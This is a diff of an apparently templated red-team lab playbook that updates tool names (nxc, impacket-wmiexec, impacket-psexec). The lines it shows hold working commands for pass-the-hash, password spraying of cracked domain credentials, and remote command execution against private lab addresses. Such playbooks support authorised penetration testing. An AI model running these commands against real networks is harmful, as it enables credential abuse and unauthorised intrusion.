@@ -25,10 +25,10 @@ If NTLM hashes are available from Kerberoast/AS-REP:
 
 ```bash
 # Test PtH against Win10
-crackmapexec smb 172.16.20.103 -u administrator -H NTLM_HASH_HERE 2>&1
+nxc smb 172.16.20.103 -u administrator -H NTLM_HASH_HERE 2>&1
 
 # Execute command via WMI with hash
-wmiexec.py {{domain}}/administrator@172.16.20.103 -hashes :NTLM_HASH_HERE \
+impacket-wmiexec {{domain}}/administrator@172.16.20.103 -hashes :NTLM_HASH_HERE \
   'whoami' 2>&1
 ```
 
@@ -43,11 +43,11 @@ CRACKED_USER=$(jq -r '.cracked[0].user // empty' {{logDir}}/cracked_creds.json)
 CRACKED_PASS=$(jq -r '.cracked[0].password // empty' {{logDir}}/cracked_creds.json)
 
 # Spray cracked password across domain
-crackmapexec smb 172.16.20.0/24 -u "$CRACKED_USER" -p "$CRACKED_PASS" \
+nxc smb 172.16.20.0/24 -u "$CRACKED_USER" -p "$CRACKED_PASS" \
   --continue-on-success 2>&1
 
 # Get shell via psexec
-psexec.py {{domain}}/"$CRACKED_USER":"$CRACKED_PASS"@172.16.20.103 'whoami' 2>&1
+impacket-psexec {{domain}}/"$CRACKED_USER":"$CRACKED_PASS"@172.16.20.103 'whoami' 2>&1
 ```
 
 ## Attack 3: WinRM / Evil-WinRM (T1021.006)
